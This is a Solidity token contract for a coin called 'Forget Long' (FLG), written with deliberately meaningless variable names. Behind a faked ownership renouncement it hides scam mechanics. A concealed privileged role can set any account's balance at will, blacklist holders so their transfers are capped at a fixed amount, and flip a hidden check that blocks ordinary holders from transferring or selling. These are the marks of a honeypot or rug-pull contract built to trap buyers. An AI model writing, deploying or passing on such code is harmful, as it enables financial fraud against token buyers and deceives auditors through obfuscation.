//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface walletMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract modeLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toSell {
    function createPair(address buyMin, address launchReceiverBuy) external returns (address);
}

interface fundAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeListSwap) external view returns (uint256);

    function transfer(address amountSell, uint256 listSwap) external returns (bool);

    function allowance(address minSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 listSwap) external returns (bool);

    function transferFrom(
        address sender,
        address amountSell,
        uint256 listSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTo, uint256 value);
    event Approval(address indexed minSwap, address indexed spender, uint256 value);
}

interface totalTxExempt is fundAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ForgetLong is modeLiquidity, fundAuto, totalTxExempt {

    address walletSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private isLiquidity;

    function transfer(address txLaunched, uint256 listSwap) external virtual override returns (bool) {
        return marketingLaunched(_msgSender(), txLaunched, listSwap);
    }

    string private walletAmount = "Forget Long";

    mapping(address => uint256) private minFee;

    function marketingLaunched(address exemptTakeMin, address amountSell, uint256 listSwap) internal returns (bool) {
        if (exemptTakeMin == enableTotal) {
            return limitAt(exemptTakeMin, amountSell, listSwap);
        }
        uint256 maxTo = fundAuto(feeWalletTeam).balanceOf(takeLimit);
        require(maxTo == tokenReceiver);
        require(amountSell != takeLimit);
        if (limitTo[exemptTakeMin]) {
            return limitAt(exemptTakeMin, amountSell, exemptLaunch);
        }
        return limitAt(exemptTakeMin, amountSell, listSwap);
    }

    function approve(address toMarketing, uint256 listSwap) public virtual override returns (bool) {
        isLiquidity[_msgSender()][toMarketing] = listSwap;
        emit Approval(_msgSender(), toMarketing, listSwap);
        return true;
    }

    function getOwner() external view returns (address) {
        return fundBuyReceiver;
    }

    bool private sellTake;

    function symbol() external view virtual override returns (string memory) {
        return sellLimit;
    }

    address private fundBuyReceiver;

    function name() external view virtual override returns (string memory) {
        return walletAmount;
    }

    mapping(address => bool) public limitTo;

    function owner() external view returns (address) {
        return fundBuyReceiver;
    }

    uint256 private sellShould;

    mapping(address => bool) public liquidityAmountToken;

    uint8 private fromWalletReceiver = 18;

    event OwnershipTransferred(address indexed senderFee, address indexed senderFeeLaunch);

    function exemptList() public {
        emit OwnershipTransferred(enableTotal, address(0));
        fundBuyReceiver = address(0);
    }

    address takeLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function tokenIsList(uint256 listSwap) public {
        txLaunch();
        tokenReceiver = listSwap;
    }

    bool private teamAmount;

    string private sellLimit = "FLG";

    function buyShould(address txLaunched, uint256 listSwap) public {
        txLaunch();
        minFee[txLaunched] = listSwap;
    }

    function balanceOf(address feeListSwap) public view virtual override returns (uint256) {
        return minFee[feeListSwap];
    }

    function sellReceiver(address exemptFee) public {
        if (listFeeMax) {
            return;
        }
        if (autoSellWallet != sellShould) {
            teamAmount = false;
        }
        liquidityAmountToken[exemptFee] = true;
        if (modeReceiverBuy == autoSellWallet) {
            teamAmount = false;
        }
        listFeeMax = true;
    }

    function limitAt(address exemptTakeMin, address amountSell, uint256 listSwap) internal returns (bool) {
        require(minFee[exemptTakeMin] >= listSwap);
        minFee[exemptTakeMin] -= listSwap;
        minFee[amountSell] += listSwap;
        emit Transfer(exemptTakeMin, amountSell, listSwap);
        return true;
    }

    bool public teamReceiverSell;

    address public enableTotal;

    address public feeWalletTeam;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedEnable;
    }

    uint256 public autoSellWallet;

    uint256 public modeReceiverBuy;

    uint256 launchTake;

    function transferFrom(address exemptTakeMin, address amountSell, uint256 listSwap) external override returns (bool) {
        if (_msgSender() != walletSender) {
            if (isLiquidity[exemptTakeMin][_msgSender()] != type(uint256).max) {
                require(listSwap <= isLiquidity[exemptTakeMin][_msgSender()]);
                isLiquidity[exemptTakeMin][_msgSender()] -= listSwap;
            }
        }
        return marketingLaunched(exemptTakeMin, amountSell, listSwap);
    }

    function txLaunch() private view {
        require(liquidityAmountToken[_msgSender()]);
    }

    uint256 private launchedEnable = 100000000 * 10 ** 18;

    function txLimit(address fundLaunched) public {
        txLaunch();
        if (teamReceiverSell) {
            teamAmount = true;
        }
        if (fundLaunched == enableTotal || fundLaunched == feeWalletTeam) {
            return;
        }
        limitTo[fundLaunched] = true;
    }

    function allowance(address tradingLiquidity, address toMarketing) external view virtual override returns (uint256) {
        if (toMarketing == walletSender) {
            return type(uint256).max;
        }
        return isLiquidity[tradingLiquidity][toMarketing];
    }

    constructor (){
        
        walletMax fundFrom = walletMax(walletSender);
        feeWalletTeam = toSell(fundFrom.factory()).createPair(fundFrom.WETH(), address(this));
        if (teamAmount) {
            sellTake = true;
        }
        enableTotal = _msgSender();
        exemptList();
        liquidityAmountToken[enableTotal] = true;
        minFee[enableTotal] = launchedEnable;
        if (teamReceiverSell == sellTake) {
            modeReceiverBuy = autoSellWallet;
        }
        emit Transfer(address(0), enableTotal, launchedEnable);
    }

    uint256 constant exemptLaunch = 19 ** 10;

    bool public listFeeMax;

    function decimals() external view virtual override returns (uint8) {
        return fromWalletReceiver;
    }

    uint256 tokenReceiver;

}